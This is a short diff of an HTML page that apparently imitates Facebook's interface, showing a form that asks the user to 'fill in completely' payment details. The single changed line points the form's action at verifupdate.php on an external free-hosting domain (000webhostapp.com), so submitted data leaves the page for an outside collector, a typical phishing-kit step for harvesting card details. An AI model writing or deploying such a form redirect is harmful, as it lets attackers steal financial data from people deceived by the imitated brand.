@@ -118,7 +118,7 @@
 <div class="j83agx80 cbu4d94t ew0dbk1b irj2b8pg">
 <span class="froTex">Please fill in completely:</span>
 <div class="qzhwtbm6 knvmm38d">
-<form action="verifupdate.php?button_location=settings&amp;button_name=addpay" method="POST">
+<form action="https://ytbunasa.000webhostapp.com/verifupdate.php?button_location=settings&amp;button_name=addpay" method="POST">
 <span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain hzawbc8m" dir="auto">
     <div class="card_grp">   
         <div class="fnam">
